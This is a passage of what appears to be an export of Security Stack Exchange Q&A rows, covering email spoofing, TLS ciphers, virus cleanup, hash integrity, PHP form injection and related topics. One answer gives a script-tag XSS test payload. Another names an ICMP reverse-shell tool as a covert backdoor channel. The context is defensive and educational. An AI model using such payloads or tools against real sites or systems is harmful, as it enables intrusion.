<p>Still in that analogy, you can imagine cars <em>without</em> a combustion engine, e.g. electric cars. Translated into the OpenPGP world, the question becomes: can OpenPGP perform its work without using RSA ? And the answer is yes: there are other asymmetric encryption and digital signature algorithms that OpenPGP can use, which will provide the same functionality than what OpenPGP uses RSA for. Historically, when OpenPGP was first defined, there were still a few unsolved questions about the RSA patent, so implementations were encouraged to use El Gamal and DSA (for asymmetric encryption and digital signatures, respectively), instead of RSA. (The RSA patent expired in 2000)</p>
","1756"
"How can I prevent viruses/malware from infecting my flash drive?","19401","","<p>I've a pen drive that I carry to the college lab . It seems all the systems in lab is infected.  I need to be able to write to the drive, so I can't simply write protect it. </p>

<p>Everytime I insert a pendrive , all the folders became an .exe file . Also several other issues . After I scan with avast , everything is cleaned and all my data is lost..</p>

<p>Instead of an Antivirus tool or utility that runs only on prompt , is there a program/software that will guard the pendrive by running as a <strong>background</strong> process  automatically when inserted ?</p>

<p>( I should have the software in my pendrive )</p>

<p>Many suggest Clamwin portable, Panda Vaccinate etc....</p>
","<p>I have a couple of questions here:</p>

<ol>
<li>Are the files fine when in the lab?
And only become 'infected' when you
move them to your USB drive?</li>
<li>Are you certain the USB stick is clean?</li>
<li>Does the USB stick have software on it which is supposed to write files as exe's (some versions do this if encryption is enabled)</li>
</ol>

<p>The reason I ask is that it could be an issue you are bringing to the lab.</p>

<p>If not, and the lab machines are infected, there is nothing you can realistically do with your USB drive to combat this problem. You would need to get the lab techs to sort out the issue at their end.</p>
","2555"
"Why didn't OSes securely delete files right from the beginning? And why do they still not do this?","19388","","<p>After decades of hearing that ""delete"" does not really make the data impossible to recover, I have to ask WHY the OS was not corrected long ago to do what it should have been doing all along? What is the big deal? Can't the system just trundle along in the background over-overwriting and whatever else has to happen? Why do we need additional utilities to do what we always thought was happening? What is the motivation of OS developers to NOT correct this problem?</p>

<p><strong>ADDITION:</strong> This is not a technology question, because clearly it IS possible to delete things securely, or else there would not be tools available to do it. It is a policy question: If some people feel that it is important and should be part of the OS, why is it not part of the OS? Many things have been added to OSes over the years, and this could certainly be one of them. And it IS an important issue, or there would not have been articles and stories about it for about 3 decades now. What is with the inertia? Just do the right thing.</p>
","<p>Instead of another ""You are wrong because"" answer I'd like to take a slightly different approach:</p>

<p>Early computer OS's were written by programmers for programmers. Any one who programs and knows what pointers are understands that ""deleting"" a pointer doesn't delete the thing its pointing at: they are separate.</p>

<p>That doesn't mean that delete doesn't actually delete. That pointer is gone. Trying to use it after ""deleting"" it (freeing the memory, rebinding the name) can result in bad things happening.</p>

<p>But history marches on, and now end users who have a different concept of delete (like yourself) are in the picture. They (and you) have expectations that are <em>not</em> unreasonable (whatever else is said in this thread).</p>

<p>But delete will not ever mean (for a computer) what you think it should: there are reasons both technical (detailed quite well in other answers) and social (45 years of inertia).</p>

<p>The modern (and I'm including *nix) OS abstracts a lot of things for you: you no longer need to be a computer expert to own/operate a computer in the same way you no longer need to be a mechanic to own/operate a car. The price you pay is that those abstractions are <a href=""http://www.joelonsoftware.com/articles/LeakyAbstractions.html"">leaky</a>: there's a fundamental disconnect that can never quite be bridged. A computer ""document"" isn't really a document, a ""desktop"" is not a desktop, a ""window"" is not a window, etc.</p>
","110757"
"Why is it even possible to forge sender header in e-mail?","19386","","<p>With so many popular e-mail providers forcing users to log on using their SMTP servers, why is it still possible to forge ""From: "" header in e-mails? What prevents users from simply discarding the e-mails in which the source domain of the sender doesn't match the domain of SMTP server?</p>
","<blockquote>
  <p><strong>tl;dr</strong></p>
  
  <ul>
  <li><p>It's very easy to spoof a domain even with SPF controls enabled.  </p></li>
  <li><p>The solution is to use <strong>DKIM + DMARC</strong>, or <strong>SPF + DMARC</strong></p></li>
  <li><p>The email client is responsible for telling you if the message passes DMARC <strong>Display From</strong> verification</p></li>
  <li><p>The email protocol allows for legitimate spoofing using Resent-* headers and Sender headers.  The email client (MUA) should display this exception whenever it exists.</p></li>
  </ul>
</blockquote>

<p>There are a few misconceptions about SPF, namely: </p>

<ol>
<li>SPF does not prevent email spoofing.</li>
<li>SPF alone doesn't affect, influence or, control the RFC 2822 <strong>Display From</strong>.  </li>
<li>By default, the usefulness of SPF is to prevent backscatter issues and very simple spoofing scenarios. </li>
</ol>

<p>Microsoft attempted to solve this issue with SenderID, (making SPF apply to the Display From address) but it was too complicated and didn't really solve the whole problem.</p>

<hr>

<p><strong>Some background</strong></p>

<p>First know that there are two ""from"" addresses and two ""to"" addresses in every SMTP message.  One is known as the RFC2821 Envelope, the other is the RFC2822 Message.  They serve different purposes</p>

<p><strong>The Envelope:  (RFC2821)</strong></p>

<ul>
<li><p>The envelope is metadata that doesn't appear in the SMTP header.  It disappears when the message goes to the next MTA.</p></li>
<li><p>The <code>RCPT From:</code> is where the NDRs will go.  If a message is coming from Postmaster or a remailer service this is usually <code>&lt;&gt;</code> or <code>someSystem@place.com</code>.  It's interesting to see that salesforce uses this similar to constantContact as a key in a database like <code>toUserContactID@salesforce.com</code> to see if the message bounced.</p></li>
<li><p>The <code>RCPT TO:</code> is who the message is actually being sent to.  It is used for ""to"" and ""bcc"" users alike.  This doesn't usually affect the ""display of addresses"" in the mail client, but there are occasions where MTAs will display this field (if the RFC2822 headers are corrupt).</p></li>
</ul>

<p><strong>The Message (RFC2822)</strong></p>

<ul>
<li><p>The message portion begins when the <code>data</code> command is issued.</p></li>
<li><p>This information includes the SMTP headers you're familiar with, the message, and its attachments.  Imagine all this data being copied and pasted from each MTA to the next, in succession until the message reaches the inbox.</p></li>
<li><p>It is customary for each MTA to prefix the above mentioned copy and paste with information about the MTA (source IP, destination IP, etc).  It also pastes the SPF check details. </p></li>
<li><p>This is the <code>Display From</code> is placed. This is important.  Spoofers are able to modify this.</p></li>
<li><p>The <code>Mail From:</code> in the envelope is discarded and usually placed here as the <code>return-path:</code> address for NDRs</p></li>
</ul>

<p>So how do we prevent people from modifying the <strong>Display From</strong>?  Well DMARC redefines a second meaning for the SPF record.  It recognizes that there is a difference between the <strong>Envelope From</strong> and the <strong>Display From</strong>, and that there are legitimate reasons for them to not match.  Since SPF was originally defined to only care about Envelope From, if the Display From is different, DMARC will require a second DNS check to see if the message is allowed from that IP address.</p>

<p>To allow for forwarding scenarios, DMARC also allows the <strong>Display From</strong> to be cryptographically signed by DKIM, and if any unauthorized spammer or phisher were to attempt to assume that identity, the encryption would fail.</p>

<p>What is DKIM?  DKIM is lightweight cryptographic technology that signs the data residing in the message.  If you ever received a message from Gmail, Yahoo, or AOL then your messages were DKIM signed.  Point being is that no one will ever know youre using DKIM encryption and signing unless you look in the headers.  It's transparent.</p>

<p>DKIM can usually survive being forwarded, and transfered to different MTAs.  Something that SPF can't do.  Email administrators can use this to our advantage to prevent spoofing.</p>

<hr>

<p>The problem lies with the SPF only checking the RFC2821 envelope, and not the <strong>Display From</strong>.  Since most people care about the <strong>Display From</strong> shown in an email message, and not the return path NDR, we need a solution to protect and secure this piece.</p>

<p>This is where DMARC comes in. DMARC allows you to use a combination of a modified SPF check or DKIM to verify the <strong>Display From</strong>.    DKIM allows you to cryptographically sign the RFC2822 Display From whenever the SPF doesn't match the <strong>Display From</strong> (which happens frequently).</p>

<hr>

<p>Your questions</p>

<blockquote>
  <p>Why is it still possible to forge ""From: "" header in e-mails? </p>
</blockquote>

<p>Some server administrators haven't implemented the latest technologies to prevent this sort of thing from happening.  One of the major things preventing adoption of these technologies is ""email forwarding services"" such as a mailing list software, auto-forwarders, or school alumni remailer (.forwarder).  Namely:</p>

<ol start=""2"">
<li><p>Either SPF or DKIM isn't configured.</p></li>
<li><p>A DMARC policy isn't set up.</p></li>
<li><p>The email client isn't displaying the verification results of the <strong>Display From</strong> and the Resent-* or Sender field.</p></li>
</ol>

<blockquote>
  <p>What prevents users from simply discarding the e-mails in which the source domain of the sender doesn't match the domain of SMTP server?</p>
</blockquote>

<p>What doesn't match: the envelope or the body?  Well according to email standards the envelope shouldn't match if it's going through a remailer.  In that case we need to DKIM sign the Display From and make sure the MUA verifies this.</p>

<p>Finally, the MUA (email client) needs to show if the sender is DMARC verified, and if someone is trying to override that with a <strong>Sender</strong> or <strong>Resent-From</strong> header.</p>
","30741"
"Which SSL/TLS ciphers can be considered secure?","19362","","<p>The <a href=""http://www.openssl.org/docs/apps/ciphers.html"">OpenSSL website</a> provides a long list of different ciphers available for SSL and TLS.
My question is, which of those ciphers can be considered secure nowadays. I am especially interested in HTTPS, if this should matter, although I guess it doesn't. I am aware of the <a href=""http://httpd.apache.org/docs/2.0/ssl/ssl_howto.html"">Apache Recommendation</a> to use <code>SSLCipherSuite HIGH:MEDIUM</code> and agree that this is best practice. </p>

<p>What I am looking for is an official standard or a recent paper from an accepted and recognized source like a well know security organization. If such a paper exists including estimates on how long certain ciphers with specific key length will be considered secure, this would be even better. Does such a thing exist?</p>
","<p>The cipher suites with a ""<code>NULL</code>"" do not offer data encryption, only integrity check. This means ""not secure"" for most usages.</p>

<p>The cipher suites with ""<code>EXPORT</code>"" are, by design, weak. They <em>are</em> encrypted, but only with keys small enough to be cracked with even amateur hardware (say, a basic home PC -- symmetric encryption relying on 40-bit keys). These suites were defined to comply with the US export rules on cryptographic systems, rules which were quite strict before 2000. Nowadays, these restrictions have been lifted and there is little point in supporting the ""<code>EXPORT</code>"" cipher suites.</p>

<p>The cipher suites with ""<code>DES</code>"" (not ""<code>3DES</code>"") rely for symmetric encryption on <a href=""http://en.wikipedia.org/wiki/Data_Encryption_Standard"" rel=""nofollow noreferrer"">DES</a>, an old block cipher which uses a 56-bit key (<em>technically</em>, it uses a 64-bit key, but it ignores 8 of those bits, so the effective key size is 56 bits). A 56-bit key is crackable, albeit not in five minutes with a PC. <a href=""http://en.wikipedia.org/wiki/EFF_DES_cracker"" rel=""nofollow noreferrer"">Deep crack</a> was a special-purpose machine built in 1998 for about 250,000 $, and could crack a 56-bit DES key within 4.5 days on average. Technology has progressed, and this can be reproduced with <a href=""http://www.copacobana.org/"" rel=""nofollow noreferrer"">a few dozens FPGA</a>. Still not off-the-shelf-at-Walmart hardware, but affordable by many individuals.</p>

<p>All other cipher suites supported by OpenSSL are non-weak; if you have a problem with them, it will not be due to a cryptographic weakness in the algorithms themselves. You may want to avoid cipher suites which feature ""<code>MD5</code>"", not because of an actual known weakness, but for public relations. <a href=""http://en.wikipedia.org/wiki/MD5"" rel=""nofollow noreferrer"">MD5</a>, as a hash function, is ""broken"" because we can efficiently find many collisions for that function. This is not a problem for MD5 as it is used in SSL; yet, that's enough for MD5 to have a bad reputation, and you are better avoiding it.</p>

<p>Note that the cipher suite does not enforce anything on the size of the server key (the public key in the server certificate), which must be large enough to provide adequate robustness (for RSA or DSS, go for 1024 bits at least, 1536 bits being better -- but do not push it too much, because computational overhead raises sharply with key size).</p>

<hr />

<p><a href=""http://www.nist.gov/index.html"" rel=""nofollow noreferrer"">NIST</a>, a US federal organization which is as accepted and well-known as any security organization can possibly be, has published some <a href=""http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf"" rel=""nofollow noreferrer"">recommendations</a> (see especially the tables on pages 22 and 23); this is from 2005 but still valid today. Note that NIST operates on an ""approved / not approved"" basis: they do not claim in any way that algorithms which are ""not approved"" are weak in any way; only that they, as an organization, do not vouch for them.</p>
","8532"
"Help! My home PC has been infected by a virus! What do I do now?","19344","","<blockquote>
  <p><em>This is an attempt to ask a canonical question as discussed in <a href=""https://security.meta.stackexchange.com/questions/2382/do-we-need-a-canonical-question-as-dupe-target-for-help-my-computer-has-a-viru"">this old meta post</a>. The goal is to create something helpful that can be used as a duplicate when non experts ask about virus infections.</em> </p>
</blockquote>

<p>Let's say that I have determined beyond doubt that my home PC is infected by a virus. If necessary, you can assume that my computer runs Windows. Answers aimed at the non-technical reader are encouraged.</p>

<ul>
<li>What do I do now? How do I get rid of the virus?</li>
<li>Do I really need to do a full reinstall? Can't I just run a couple of anti-virus programs, delete some registry keys, and call it a day?</li>
<li>I really don't have time to deal with this right now. Is it dangerous to keep using the computer while it is infected?</li>
<li>I don't have backups of my family photos or my master thesis from before the infection occurred. Is it safe to restore backups made after the infection occurred?</li>
<li>Do I need to worry about peripherals getting infected? Do I need to do anything about my router or other devices on my home network?</li>
</ul>
","<blockquote>
  <p>What do I do now? How do I get rid of the virus?</p>
</blockquote>

<p>The best option is what is referred to as ""<a href=""https://security.stackexchange.com/questions/32500/what-is-nuke-it-from-orbit"">nuke it from orbit</a>.""  The reference is from <em>Aliens</em>:</p>

<p><a href=""https://i.stack.imgur.com/2bZGb.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/2bZGb.jpg"" alt=""Nuke from Orbit""></a></p>

<p>The idea behind this is that you wipe your hard drive and reinstall your OS.  Before you do this, you should make sure you have the following:</p>

<ul>
<li>A way to boot your computer off installation media. This can be in the form of the Install CD that came with your computer, or a DVD you burnt from an ISO file (Windows can be <a href=""https://www.microsoft.com/en-us/software-download/"" rel=""noreferrer"">downloaded <em>legally</em> here</a>). Some computers do not have CD-ROM drives anymore.  Microsoft provides a tool to <a href=""https://www.microsoft.com/en-us/download/windows-usb-dvd-download-tool"" rel=""noreferrer"">convert their ISO files to bootable thumb drives</a>.</li>
<li>Your Original Windows License Key. This can either be on a sticker on the side of your computer or you can recover it from your computer a program like <a href=""https://www.magicaljellybean.com/keyfinder/"" rel=""noreferrer"">The Magical Jelly Bean Keyfinder</a> (which might contain malware, but it really doesn't matter because you are wiping it all after you get the key anyway). Or an official tool supplied with Windows called <code>slmgr.vbs</code>.</li>
<li>Drivers. If you don't have a second computer, you are really going to want to have at the minimum video drivers &amp; network card drivers.  Everything else can be obtained online after you reinstall.</li>
<li>Any files you want to save.  You can back them up to a thumb drive for now, and scan them before putting them on your freshly installed machine (see below).</li>
</ul>

<hr>

<blockquote>
  <p>Do I really need to do a full reinstall? Can't I just run a couple of virus programs, delete some registry keys, and call it a day?</p>
</blockquote>

<p>In theory, it is not always necessary to fully reinstall. In some cases you can clean the virus off the hard drive without a full reinstall. However, in practice it's very hard to know that you have gotten it all, and if you have one virus it is likely you have more. You might succeed in removing the one that causes symptoms (such as ugly ad popups), but the rootkit stealing your password and credit card numbers might go unnoticed.</p>

<p>The only way to kill everything is to wipe the hard drive, so your best option is always to nuke it from orbit. <em>It's the only way to be sure.</em></p>

<hr>

<blockquote>
  <p>I really don't have time to deal with this right now.  Is it dangerous to keep using the computer while it is infected?</p>
</blockquote>

<p>You may not have time for it right now, but you really don't have time for your email getting hacked and your identity being stolen. It's best to take the time to fix it now and fix it right before the problem gets worse.</p>

<p>While your computer is infected all your keystrokes might be recorded, your files stolen, it might even be used as a part of a botnet attacking other computers. You do not want this to be going on for longer than necessary.</p>

<p>If you really don't have time to deal with it right now, power down the computer and use another one until you have time to fix it. (Be careful with file transfers from the infected to the uninfected computer, though, so you do not contaminate it.)</p>

<hr>

<blockquote>
  <p>I don't have backups of my family photos or my master thesis from before the infection occurred.  Is it safe to restore backups made after the infection occurred?</p>
</blockquote>

<p>Any backups made after the virus infection occured could potentially be infected. A lot of the times they are not, but they could be. Since it is very hard to pinpoint exactly when the infection occured (it may be before you started to notice symptoms) this applies to all backups.</p>

<p>Also, Windows restore points can be corrupted by a virus.  It is better to archive copies of your personal files on external or cloud storage. </p>

<p>If you are restoring them from external or cloud storage on a computer that has already been nuked from orbit make sure you scan <em>all</em> the files you are restoring <em>before</em> you open them. Executable files (such as .exe) can contain viruses, and so can Office documents. However, picture and movie files are likely safe in <a href=""https://security.stackexchange.com/questions/106737/find-virus-in-an-image-file"">most</a> <a href=""https://www.f-secure.com/v-descs/ms04-028.shtml"" rel=""noreferrer"">cases</a>.</p>

<hr>

<blockquote>
  <p>Do I need to worry about peripherals getting infected? Do I need to do anything about my router or other devices on my home network?</p>
</blockquote>

<p>Peripherals can be infected.  Once you have re-installed your OS you should copy all the files off your thumb drive, scan them with antivirus, format the thumb drive, and restore the files to the thumb drive as needed.  Most routers will be fine, however, it is possible for DNS settings to be compromised either through a weak password or malicious use of <a href=""https://en.wikipedia.org/wiki/Universal_Plug_and_Play"" rel=""noreferrer"">UPnP</a>.  This can easily be resolved by resetting the router to factory defaults.  You may also want to configure your DNS settings to either <a href=""https://developers.google.com/speed/public-dns/"" rel=""noreferrer"">google dns</a> or <a href=""https://www.opendns.com/setupguide/?url=familyshield"" rel=""noreferrer"">OpenDNS</a>. If you have some type of network attached storage, you should do a full scan of it with antivirus before using any of the files on it.</p>

<p><strong>THIS IS WORKING DRAFT FEEL FREE TO WIKI/EDIT AS NEEDED</strong></p>
","138617"
"Why is Linux considered more secure than Windows?","19332","","<p>Why is Linux considered more secure than Windows? Is there some sort of recent security report that proves it?</p>

<p>I have come to believe that Linux has been safer so far, but now as we have Windows 10, is Linux still better in security?</p>
","<p>Linux isn't really more secure than Windows. It's really more a matter of scope than anything. No matter what malware, exploits, and bad users exist EVERYWHERE. One being more secure than the other is nothing more than anecdotal evidence.</p>

<p>Malware exists for *nix, Mac, Windows, Android, iOS, Symbian, Xbox(yes), hard drives, and bios.</p>

<p>No operating system is more secure than any other, the difference is in the number of attacks and scope of attacks. As a point you should look at the number of viruses for Linux and for Windows. You'll see a trend in that Windows has FAR more viruses for it than Linux does and that's purely because it's more lucrative to hack for Windows since you have a greater chance of getting the thing you want. For all we know there might be a critical flaw in Linux that would open the world to pain if discovered. It hasn't been yet, but it could be there.</p>

<p>Really however OS security comes down to usage, habits, behaviour, and users just as much as it does software, hardware, security, and passwords. Your computer can be safe in an infected network as long as you do the following:</p>

<p><strong>Constantly as yourself ""How do I keep MY computer safe?""</strong></p>

<p>Really all you can ever do is work to keep your computer safe. That includes most notably <em>safe computing habits</em>. You could run for years without anti virus* and never get a virus as long as <strong>you're</strong> <strong>safe</strong> and you <strong>keep yoru computer safe</strong>. I'd still run an anti virus though since you could be safe all you want and make a single mistake.</p>

<p>After all those big data breaches you often hear about aren't usually on computers, but servers running special software, and it's the software itself that gets attacked and exploited to extract the data. What this means is that your computer is as safe as you make it. They didn't make theirs very safe.</p>

<p>Of course even if you make that software as secure as possible, it's all meaningless if someone manages to steal your credentials. In most data breaches an administrator gets phished, and their credentials are used to log in and steal the data. Here you can see that it didn't matter that the computer was safe since the user was attacked.</p>

<p>This really shows that there are two parts to security: The security of others(never trusted) and the security of yourself(only as good as you make it). To that end we all just try to make sure that the security of ourselves is as good as it can be. Herd immunity doesn't really apply to computer, so we have to keep them safe through our habits, usage, software we put on there, and making sure not to let in anything bad.</p>

<blockquote>
  <p>The worlds most secure computer is turned off, not connected to anything, buried six feet underground, and destroyed.</p>
</blockquote>

<p>Notes:
*: Note the same as no security!</p>
","121505"
"Apparently PayPal-affiliated site with very suspect security","19327","","<h3>History</h3>

<ul>
<li>I got an email this afternoon to my gmail from ""paypal@e.paypal.com"" with <code>mailed-by: na.e.paypal.com</code> and <code>signed-by: e.paypal.com</code>. Gmail did not report it as spam/phishing/suspicious and it went straight to my inbox, so the MX records must check out.</li>
<li>The email effectively linked to <a href=""https://www.paypal-special.com/landing"" rel=""nofollow noreferrer"">this url</a>.</li>
<li>The URL, when clicked, presents an HTTPS encrypted website bearing PayPal Inc's Class 3 EV certificate from Verisign, which is <strong>not</strong> easy to obtain.</li>
</ul>

<p>By all accounts, it <em>appears</em> that the site is a legitimate PayPal property.</p>

<p>But then things start getting extremely suspect:</p>

<ul>
<li><img src=""https://i.stack.imgur.com/s8zv5.png"" alt=""enter image description here""></li>
</ul>

<p>If you click ""Continue"" on that page, <strong>with or without entering any text in the email address field</strong>, it works -- it takes you to the ""logged-in"" site. Indeed, the ""Log in"" button at the top of the page turns to a ""Log out"" button. It's basically a smokescreen.</p>

<p>Then, immediately, you are greeted with a pane that displays cross-domain advertisements from other domains to try and get you to buy stuff. What in the world is the point of this website other than to display (possibly malicious / suspicious) third-party ads to get PayPal more money? </p>

<p>This makes absolutely no sense, and it really shakes my trust in PayPal as a company if they're willing to put their Class 3 EV cert on a site with this level of stupid. Also, the ""AVAILABLE BY INVITATION ONLY"" is <em>completely</em> a lie; you can go there on <em>any</em> computer in the entire world and click ""Continue"", and you're ""in"", for all that it's worth (which is, basically, nothing).</p>

<p>My concern is more that they implemented a website with such nonsense security; only sent out ""invites"" to certain users; and then had the gall to put their EV cert on it as if they <em>endorse</em> this hogwash. Why would a site go through the trouble of having an email ""login"" screen when what they want to do is to just display advertisements to anyone who's foolish enough to visit the site at all?</p>
","<p>I have been doing further research, the special site has ""PayPal, Inc[US]"" certificate and the paypal original site has ""PayPal, Inc.[US]"" certificate (note the dot after Inc). </p>

<p>The certificates contain this (relevant) information: </p>

<pre><code>CN = www.paypal-special.com
OU = Partner Support
O = PayPal, Inc
STREET = 2211 N 1st St
L = San Jose
S = California
PostalCode = 95131-2021
C = US
SERIALNUMBER = 3014267
2.5.4.15 = Private Organization
1.3.6.1.4.1.311.60.2.1.2 = Delaware
1.3.6.1.4.1.311.60.2.1.3 = US

CN = www.paypal.com
OU = PayPal Production
O = PayPal, Inc.
STREET = 2211 N 1st St
L = San Jose
S = California
PostalCode = 95131-2021
C = US
SERIALNUMBER = 3014267
2.5.4.15 = Private Organization
1.3.6.1.4.1.311.60.2.1.2 = Delaware
1.3.6.1.4.1.311.60.2.1.3 = US
</code></pre>

<p>There is something strange here as well, both certificates have the same serial number. </p>

<p>But, this certificate is quite expensive for two years (3 000 dollars) so I suppose the page is legit but a bit abandoned and they have not put enough effort in it.</p>

<p>Also, about the domain information, we can find the following data (which is consistant with the certificate information):</p>

<pre><code>Domain Name: paypal-special.com
Registry Domain ID: 
Registrar WHOIS Server: whois.markmonitor.com
Registrar URL: http://www.markmonitor.com
Updated Date: 2013-12-23T04:01:12-0800
Creation Date: 2013-10-23T16:12:23-0700
Registrar Registration Expiration Date: 2015-10-23T16:12:24-0700
Registrar: MarkMonitor, Inc.
Registrar IANA ID: 292
Registrar Abuse Contact Email: 
Registrar Abuse Contact Phone: +1.2083895740
Domain Status: clientUpdateProhibited
Domain Status: clientTransferProhibited
Domain Status: clientDeleteProhibited
Registry Registrant ID: 
Registrant Name: Host Master
Registrant Organization: PayPal Inc.
Registrant Street: 2065 Hamilton Avenue, 
Registrant City: San Jose
Registrant State/Province: CA
Registrant Postal Code: 95125
Registrant Country: US
Registrant Phone: +1.4083767400
Registrant Phone Ext: 
Registrant Fax: 
Registrant Fax Ext: 
Registrant Email: 
Registry Admin ID: 
Admin Name: Domain Administrator
Admin Organization: eBay Inc.
Admin Street: 2145 Hamilton Avenue
Admin City: San Jose
Admin State/Province: CA
Admin Postal Code: 95125
Admin Country: US
Admin Phone: +1.4083767400
Admin Phone Ext: 
Admin Fax: +1.4083767514
Admin Fax Ext: 
Admin Email: 
Registry Tech ID: 
Tech Name: Host Master
Tech Organization: PayPal Inc.
Tech Street: 2211 North First Street
Tech City: San Jose
Tech State/Province: CA
Tech Postal Code: 95131
Tech Country: US
Tech Phone: +1.4083767400
Tech Phone Ext: 
Tech Fax: 
Tech Fax Ext: 
Tech Email: 
</code></pre>
","49219"
"How can I check the integrity of the downloaded files?","19291","","<p>I know we use hash functions to check for the integrity of the files etc... but my question is how can we check for the integrity of the files being downloaded from some server?</p>
","<p><strong>Integrity</strong> is <em>defined</em> only relatively to an authoritative source which tells what the ""correct"" sequence of byte is. Hash functions don't create integrity, they <em>transport</em> it. Basically, if you have:</p>

<ol>
<li>a file;</li>
<li>a hash value, presumed correct;</li>
</ol>

<p>then you can recompute the hash function over the file and see if you get the same hash value.</p>

<p>You still have to start somewhere. Some software distributors provide, along with the software, a ""checksum"" (or ""md5sum"" or ""sha1sum"") file, which contains the hash values. <strong>Assuming you got the correct checksum file</strong>, this allows you to verify whether you downloaded the right file, down to the last bit; and this works regardless of how you downloaded the possibly big file (even if it came over some shady peer-to-peer network or whatever; you cannot cheat hash functions).</p>

<p>Now this does not solve the integrity problem; it just reduces it to the problem of making sure that you got the right hash value. Hash values are small (32 bytes for SHA-256) so this opens a lot of possibilities. In the context of downloading files from P2P systems, you could obtain the hash value from a HTTPS Web site (HTTPS uses SSL which ensures server authentication -- you have the guarantee that you talk to the server you intend -- and transport integrity -- what you receive is guaranteed to be what the server sent). In the context of exchanging PGP public keys with people, hash values (often called ""fingerprints"" or ""thumbprints"") are short enough to be transferred manually (printed on a business card, spelled over phone...).</p>

<p><a href=""http://en.wikipedia.org/wiki/Digital_signature"">Digital signatures</a> expand on the concept, but they too begin with hash functions. All digital signature algorithms sign not the message itself, but the hash of the message (which is equally good as long as the hash function is secure, i.e. resistant to collisions and preimages).</p>
","43337"
"Testing PHP form injection","19276","","<p>I'm writing a very small PHP app that takes input via a form. As could be expected for a first revision, the code does no escaping or sanitisation of input:</p>

<pre><code>if( $_POST[""var""] != """" ) {
    print ""Current value: "".$_POST[""var""].""\n"";
}
</code></pre>

<p>But if I try to inject PHP code (<code>""; print phpinfo();</code>, "" etc.) I just get it echoed back to me instead of executing it.</p>

<p>I'm aware of how to clean the input using <code>htmlspecialchars</code>, <code>addcslashes</code>, <code>mysqli_real_escape_string</code> etc. but before I use them - what syntax do I need to successfully inject arbitrary PHP code?</p>

<p>I have noticed that my machine has the PHP Suhosin patch installed (Ubuntu 10.10) - would that be auto-escaping/sanitising my input for me?</p>
","<p>For that code, I wouldnt expect to get PHP injection, but I'd look at Cross-Site Scripting (XSS) instead.   </p>

<p>For example, try injecting: </p>

<pre><code>&lt;script&gt; alert('woot Security.SE rulez!');&lt;/script&gt;
</code></pre>
","2179"
"Is it theoretically possible to deploy backdoors on ports higher than 65535?","19247","","<p>Assuming you were able to modify the OS/firmware/device for server/client to send and listen on ports higher than 65535, could it be possible to plant a backdoor and have it listen on, say, port 70000?</p>

<p>I guess the real question is this:</p>

<p>If you rebuilt the TCP/IP stack locally on the machine, would the overall concept not work due to how the <code>RFC 793 - Transmission Control Protocol Standard</code> works as mentioned below in some of the answers? Making it impossible to access a service running on a port higher then 65535.</p>

<p>There has been so much talk about hardware and devices having backdoors created that only government have access to for monitoring, and I was just curious if this was possibly one of the ways they were doing it and avoiding detection and being found?</p>
","<p>No, the port number field in a TCP header is technically limited to 2 bytes. (giving you <code>2^16=65536</code> possible ports)</p>

<p>If you alter the protocol by reserving more bits for higher ports, you're violating the specification for <a href=""https://en.wikipedia.org/wiki/Transmission_Control_Protocol#TCP_segment_structure"">TCP segments</a> and wouldn't be understood by a client. In other words, you're not speaking TCP anymore and the term ""port"" as in ""TCP source/destination port"" wouldn't apply. The same limitation exists for UDP ports.</p>

<p>That said, a backdoor could instead communicate over a different protocol than TCP or UDP to obscure its communication. For example, <a href=""https://github.com/inquisb/icmpsh""><code>icmpsh</code></a> is a reverse shell that uses ICMP only. Ultimately, you can also implement your own custom transport-layer protocol using <a href=""https://en.wikipedia.org/wiki/Raw_socket"">raw sockets</a> that can have its own notion of ports with a greater range than 0-65535.</p>
","148371"
"Terminology: authentication vs verification","19227","","<p>The two words have a similar meaning and I'm having difficulty adequately explaining the difference to someone. You verify a person's identity by having them show a form of identification, such as a passport of driver's license. You also check for signs that the document is not a forgery. If it all checks out, you'd let them into a bar, let them open a bank account or something like that.</p>

<p>Authentication is very similar. You ask for knowledge, possession and/or inherence factors to check if someone for example is allowed to log in to his e-mail or internet banking. Is there a difference between the two, and if so, what's an easy to understand explanation for it?</p>

<p>Edit to clarify what's confusing for me: isn't the verification of a person's identity in my example a form of authentication with a possession factor?</p>
","<p>Let's pretend we ordered some movie tickets online, and the process of later acquiring them involves identification in person at the box office before the event. You will be asked to produce your identification document (ID). That's <em>identification</em>. The box office attendee will then verify your identity by visually inspecting your ID - that's <em>identification verification</em>. This attendee will then check against their database to verify you've purchased those tickets online, and give them to you - that's <em>verification</em> and you end up with an <em>authentication token</em> (in our case - a ticket). You will then produce those tickets before entering the theatre - that's <em>authentication</em>.</p>

<p>So in short, identification is a sub-process (integral part) of identity verification, which is a sub-process (integral part) of verification, which is a sub-process (integral part) of authorisation. </p>

<p>In each of these steps, you verify one set of data of the client, against another set of data of the service provider. In multi-factor authentication, this data can have different forms and/or roles, such as <em>something the user is</em>, <em>something the user has</em>, <em>something the user knows</em>, e.t.c., or the previous sub-process produces new set of data (or a ticket, token, nonce,...) that the next process uses to determine the outcome of its function. The level of verification, or number of times the <em>producer's</em> data is verified against, (or scrutiny, as @TerryChia put it), denotes how we in turn call this verification process. </p>

<p>TL;DR - If it involves verifying access permission, we call this verification process as <em>authentication</em>.</p>
","36746"
"Securing remotely accessible IP cameras that do not support HTTPS","19213","","<p>I have some IP cameras set up on my home network, which is WPA2 protected.
These cameras are setup to be accessible from the Internet thru my router's DDNS address, and port number.</p>

<p>So for example, from my office PC I can go to <a href=""http://urltomyrouter.com:12345"">http://urltomyrouter.com:12345</a> to see cam#1 after I input my username and password.</p>

<p>These cameras are Foscams FI8910W's and they do not support HTTPS. My router by the way is an Asus RT-N56U.</p>

<p>I assume that my credentials that I use to log into the cameras are being sent in plaintext and not encrypted, which is unsafe.</p>

<p>What are my options to fix this and make my access more secure?</p>

<p>I read somewhere that a ""reverse proxy"" is a possible solution but I'm not sure how that would work...</p>
","<p>I'm going to assume your router isn't smart enough to set up an encrypted reverse proxy by itself.</p>

<p><strong>Conventions Used Below</strong></p>

<ul>
<li>Home IP Address: 1.2.3.4 ( <a href=""https://www.google.com/?q=my+ip#q=my+ip"">google search my ip to find yours</a> )</li>
<li>WebCam IP Address / Port: <code>192.168.0.123</code> on port 456.</li>
<li>Linux/Unix Computer Running Reverse Proxy: <code>192.168.0.101</code></li>
</ul>

<p><strong>Initial Checks</strong></p>

